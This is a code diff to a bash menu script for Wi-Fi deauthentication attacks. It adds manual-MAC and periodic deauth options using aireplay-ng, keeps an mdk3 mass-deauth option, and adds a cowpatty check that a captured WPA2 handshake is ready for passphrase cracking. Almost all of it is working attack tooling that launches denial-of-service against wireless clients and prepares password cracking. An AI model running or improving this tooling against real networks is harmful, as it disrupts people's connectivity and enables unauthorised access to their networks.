@@ -13,7 +13,9 @@ YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
 PAKT="Press "$YS"any key$CE to"
 PAKTC="Press "$YS"any key$CE to continue..."
 PAKTGB="Press "$YS"any key$CE to go back..."
-
+LPATH="/root/lscript"
+DPID=$$
+echo -e "$DPID" > "$LPATH"/dpid.txt
 ####################################
 printf '\033]2;DEAUTH MENU\a'
 k=1
@@ -61,10 +63,29 @@ do
 		n=$((n+1))
 	done
 	echo -e ""$YS" a"$CE") Deauth all clients separately"
+	echo -e ""$YS" m"$CE") Manually type a MAC to deauth"
 	echo -e ""$YS" r"$CE") Refresh"
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e "Choose: "
 	read STATION
+	clear
+	if [[ "$STATION" = "m" ]]
+	then
+		echo -e "MAC to deauth: "
+		read MACTD
+		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
+		read DEAUTHS
+		if [[ "$DEAUTHS" = "" ]]
+		then
+			DEAUTHS=0
+		fi
+		echo -e "MAC to deauth: "
+		read MACTD
+		export DEAUTHS
+		export TARGB
+		export MACTD
+		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $MACTD $IGNN $WLANNM && exit; exec bash' & disown
+	fi
 	if [[ "$STATION" = "r" ]]
 	then
 		clear
@@ -85,7 +106,7 @@ do
 			export DEAUTHS
 			export TARGB
 			export DSTATION
-			xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $WLANNM && exit; exec bash' & disown
+			xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown
 			n=$((n+1))
 		done
 	fi
@@ -105,7 +126,7 @@ do
 		export DEAUTHS
 		export TARGB
 		export DSTATION
-		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $WLANNM && exit; exec bash' & disown
+		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown
 	fi
 done
 }
@@ -142,15 +163,47 @@ function pyrit_hand_check
 		sleep 2
 	fi
 }
+function cowpatty_hand_check
+{
+	clear
+	echo -e "Checking handshake with cowpatty..."
+	sleep 1
+	TEMPHAND=$(cowpatty -c -r "$HANDCAP" | grep "Collected all necessary data to mount crack against WPA2/PSK passphrase.")
+	clear
+	if [[ "$TEMPHAND" = "" ]]
+	then
+		VALIDH=0
+		echo -e ""$RS"No handshake found"$CE""
+		sleep 1
+	else
+		VALIDH=1
+		echo -e ""$YS"Valid handshake found!"$CE""
+		sleep 2
+	fi
+}
+if [[ -f "$LPATH"/settings/ignorenegativeone.txt ]]
+then
+	read IGN < ""$LPATH"/settings/ignorenegativeone.txt"
+else
+	IGN="no"
+fi
+if [[ "$IGN" = "yes" ]]
+then
+	IGNN="--ignore-negative-one"
+else
+	IGNN=""
+fi
+
 while true
 do
 	clear
 	echo -e ""$YS" 1"$CE") Deauth all                      aireplay-ng"
 	echo -e ""$YS" 2"$CE") Deauth all                      mdk3"
 	echo -e ""$YS" 3"$CE") Deauth client/s                 aireplay-ng"
+	echo -e ""$YS" 4"$CE") Deauth all periodically         aireplay-ng"
 	if [[ "$HANDF" != "deauth" ]]
 	then
-		echo -e ""$YS" 4"$CE") Check handshake quality"
+		echo -e ""$YS" 5"$CE") Check handshake quality"
 	fi
 	if [[ "$LASTOPTIONS" != "" ]]
 	then
@@ -166,15 +219,44 @@ do
 		then
 			DEAUTHS=0
 		fi
-		LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM"
+		LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM"
 		export DEAUTHS
 		export TARGB
-		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash'
+		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit; exec bash'
 	elif [[ "$DT" == 4 ]]
+	then
+		echo -e "Number of deauths per time: "
+		read DPT
+		echo -e "Delay in seconds: "
+		read DIS
+		export DIS
+		export DPT
+		clear
+		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e "while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit"
+	elif [[ "$DT" == 5 ]]
 	then
 		if [[ "$HANDF" != "deauth" ]]
 		then
-			pyrit_hand_check
+			while true
+			do
+				clear
+				echo -e ""$YS" 1"$CE") Check with pyrit"
+				echo -e ""$YS" 2"$CE") Check with cowpatty"
+				echo -e ""$YS" b"$CE") Go back"
+				echo -e "Choose: "
+				read CHW
+				if [[ "$CHW" = 1 ]]
+				then
+					pyrit_hand_check
+				elif [[ "$CHW" = 2 ]]
+				then
+					cowpatty_hand_check
+				elif [[ "$CHW" = "b" ]]
+				then
+					clear
+					break
+				fi
+			done
 		fi
 	elif [[ "$DT" == "" ]]
 	then
@@ -184,7 +266,7 @@ do
 			then
 				if [[ "$LASTOPTIONS" = 1 ]]
 				then
-					option4
+					option3
 				else
 					xterm -geometry 90x15+9999+999999 -e bash -c "$LASTOPTIONS; exec bash"
 				fi
@@ -200,11 +282,8 @@ do
 		xterm -geometry 90x15+9999+999999 -e bash -c 'mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' 
 	elif [[ "$DT" = 3 ]]
 	then
-		option3
-	elif [[ "$DT" = 4 ]]
-	then
 		LASTOPTIONS=1
-		option4
+		option3
 	elif [[ "$DT" = 0 ]]
 	then
 		exit
